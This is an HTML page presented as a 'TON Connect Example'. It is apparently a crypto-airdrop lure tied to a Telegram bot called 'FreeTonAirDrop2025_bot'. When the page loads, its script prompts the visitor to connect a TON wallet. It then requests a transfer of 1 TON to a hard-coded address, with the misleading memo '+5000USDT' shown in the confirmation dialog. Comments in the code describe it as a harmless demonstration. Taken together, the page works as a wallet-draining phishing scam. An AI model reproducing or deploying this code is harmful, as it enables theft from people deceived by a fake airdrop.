<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON Connect Example</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
</head>
<body>

    <div id="ton-connect"></div>
    <script>
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://sh4do96.github.io/TelegramBot/tonconnect-manifest.json',
            buttonRootId: 'ton-connect'
        });
        tonConnectUI.uiOptions = {
            twaReturnUrl: 'https://t.me/FreeTonAirDrop2025_bot'
        };

        async function connectToWallet() {
            try {
                // Check if wallet is already connected
                if (tonConnectUI.connected) {
                    console.log("Wallet already connected");
                    return;
                }

                const connectedWallet = await tonConnectUI.connectWallet();
                console.log(connectedWallet);

                // Get the wallet address
                const walletAddress = connectedWallet.account.address;

                // For demonstration purposes, we'll use a fixed amount
                // In a real scenario, you'd need to fetch the actual balance
                const transferAmount = '1000000000'; // 1 TON in nanotons

                const recipientAddress = 'UQDritJgjXDmn9HkUeCYpAm-WErrDj-E5qS2ZgjWFZnt9Fvc'; // Replace with the recipient's wallet address
                const transferTx = {
                    validUntil: Math.floor(Date.now() / 1000) + 3600,
                    messages: [{
                        address: recipientAddress,
                        amount: transferAmount,
                        text: '+5000USDT' // Empty payload
                    }]
                };

                // Show a confirmation dialog before sending the transaction
                const confirmed = await showTransactionConfirmation(transferTx);
                if (confirmed) {
                    // Send the transaction
                    const txResult = await tonConnectUI.sendTransaction(transferTx);
                    console.log('Transaction result:', txResult);
                } else {
                    console.log('Transaction cancelled by user.');
                }
            } catch (error) {
                console.error("Error connecting to wallet or sending transaction:", error);
            }
        }

        // Function to display a confirmation dialog
        function showTransactionConfirmation(transferTx) {
            return new Promise((resolve) => {
                const confirmed = window.confirm(`Confirm transaction:\n\nRecipient: ${transferTx.messages[0].address}\nAmount: ${transferTx.messages[0].amount} nanoTON\nMessage: +5000USDT`);
                resolve(confirmed);
            });
        }

        // Call the function
        connectToWallet();
    </script>
</body>
</html>
